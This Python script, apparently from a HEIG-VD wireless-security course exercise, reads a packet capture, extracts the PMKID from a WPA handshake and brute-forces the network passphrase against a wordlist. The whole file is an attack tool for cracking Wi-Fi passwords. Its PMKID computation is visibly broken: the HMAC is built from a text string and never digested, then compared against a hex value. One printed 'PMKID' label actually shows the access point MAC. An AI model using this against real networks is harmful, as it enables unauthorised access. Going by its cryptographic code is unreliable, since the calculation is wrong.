#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey. Modifié par David Pellissier et Michael Ruckstuhl"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

import argparse
from binascii import b2a_hex, a2b_hex
from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from pbkdf2 import *


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def get_association_info(packets):
    """
    Returns the SSID, AP_MAC and Client_MAC, which are extracted from the association request
    """
    for p in packets:
        if p.haslayer("Dot11AssoReq"):
            ssid = p.info
            print(ssid)
            ap_mac = a2b_hex(p.addr1.replace(':', ''))
            client_mac = a2b_hex(p.addr2.replace(':', ''))
            return ssid, ap_mac, client_mac
    raise Exception("Couldn't find WPA association")


def get_pmkid_packet(packets):
    """
    returns the first packet containing a PMKID value. It is always the first message of a 4-way handshake
    """
    for p in packets:
        # Find the first message of a handshake. It is caracterized by having wpa_key_mic at 0
        if p.haslayer(WPA_key) and not int.from_bytes(p.wpa_key_mic, "big"):  # big or little endian is not important
            return p

    raise Exception("Couldn't find PMKID")


def pmkid_bruteforce(pmkid, ssid, mac_ap, mac_sta, const, wordlist):
    with open(wordlist) as file1:
        pmkid_expected = b2a_hex(pmkid)

        for passphrase in file1:

            passphrase = passphrase.strip()  # removes \n
            passphrase = str.encode(passphrase)

            # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
            # calculate pmkid
            pmkid_guess = hmac.new(pmk, f"{const}{mac_ap}{mac_sta}")

            print(f"\r{passphrase.decode():20} = {pmkid_guess}          ", end="", flush=True)

            if pmkid_guess == pmkid_expected:
                print("")
                return passphrase.decode()

    print("")
    return None


def find_ssid(ap_mac, packets):
    for p in packets:
        if p.haslayer("Dot11AssoReq") and p.addr1 == ap_mac:
            ssid = p.info
            return ssid

    raise Exception("Couldn't find the SSID of this MAC address")


def main(pcap_file, dictionary):
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap(pcap_file)

    p = get_pmkid_packet(wpa)

    pmkid = p.wpa_key[-16:]

    ap_mac = p.addr1
    sta_mac = p.addr2
    const = "PMK Name"
    ssid = find_ssid(ap_mac, wpa)

    print("Values used to calculate PMKID:")
    print("PMKID:       ", b2a_hex(ap_mac))
    print("AP Mac:      ", b2a_hex(ap_mac))
    print("CLient Mac:  ", b2a_hex(sta_mac))
    print("SSID:        ", ssid)
    print("Constant:    ", const)

    print("\nBruteforcing PMKID")
    print("============================")
    print("Expected PMKID:         ", b2a_hex(pmkid))
    passphrase = pmkid_bruteforce(pmkid, ssid, ap_mac, sta_mac, const, dictionary)

    if passphrase:
        print("Found passphrase:", passphrase)
    else:
        print("Couldn't find the passphrase with this word list.")


if __name__ == "__main__":
    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top62.txt"  # https://github.com/Taknok/French-Wordlist
    pcap = "PMKID_handshake.pcap"
    main(pcap, default_wordlist)

    '''
    # just parsing arguments
    parser = argparse.ArgumentParser(
        description="Performs a dictionary-based bruteforce of the passphrase of a WPA handshake.",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
        
    parser.add_argument("pcap", help="Network capture containing the authentication + the 4-way handshake of a WPA connection.")
    parser.add_argument("-d", "--dictionary", default=default_wordlist, help="The dictionary to use for bruteforcing the key. By default, a french wordlist is used")
    args = parser.parse_args()
    main(args.pcap, args.dictionary)
    '''
